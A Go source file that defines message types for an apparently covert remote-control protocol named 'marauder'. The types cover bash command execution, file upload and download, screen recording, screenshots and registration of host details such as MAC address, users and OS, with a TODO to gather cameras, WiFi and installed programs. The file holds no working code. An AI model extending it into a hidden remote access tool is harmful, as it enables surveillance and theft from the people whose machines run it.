package internal

// ==========================================================================================
// CLIENT SIDE API
// ==========================================================================================

// ==================================================
// All requests must have this
// ==================================================
type RequestHeaders struct {
	Reqid string
	Cmd   string
}

// ==================================================
// Request to execute a bash shell command
// ==================================================
type BashRequest struct {
	RequestHeaders
	Data []string
}

// ==================================================
// Request to
// + send files to server
// + download files from URLs to HOME
// ==================================================
type FilesRequest struct {
	RequestHeaders
	Action string
	Files  []string
}

// ==================================================
// Request to
// + start record screen
// + stop record screen
// + take screenshot
// ==================================================
type ScreenRequest struct {
	RequestHeaders
	Action        string
	Action_status string
	Seconds       int
}

// ==========================================================================================
// SERVER SIDE API
// ==========================================================================================

// ==================================================
// All responses must have this
// ==================================================
type ResponseHeaders struct {
	Reqid  string `json:"reqid"`
	Err    bool   `json:"err"`
	Errmsg string `json:"errmsg"`
}

// ==================================================
// Response of shell command execution
// ==================================================
type BashResponse struct {
	ResponseHeaders
	Result string `json:"result"`
}

// ==================================================
// Response of shell command execution
// ==================================================
type ScreenshotNotification struct {
	ResponseHeaders
	Filename string `json:"filename"`
}

// Sends marauder data for registration to the server
// @action: marauder action
// @devicetype: marauder device type - desktop|mobile ~ (Always desktop in this program)
// @machinename: marauder machine name
// @username: marauder username
// @os: marauder operating system
// @machineusers: list of users in the machine
// @installationdate: date of the installation of the OS YYYY-MM-DD
// TODO: add devices info (cameras, keyboards, mouses, number of screens, harddrives, WiFi info, programs installed)
type MarauderRegistrationRequest struct {
	Action             string   `json:"action"`
	Macaddress         string   `json:"macaddress"`
	Devicetype         string   `json:"devicetype"`
	Devicename         string   `json:"devicename"`
	Username           string   `json:"username"`
	Os                 string   `json:"os"`
	Machineusers       []string `json:"machineusers"`
	OsInstallationdate string   `json:"osinstallationdate"`
}
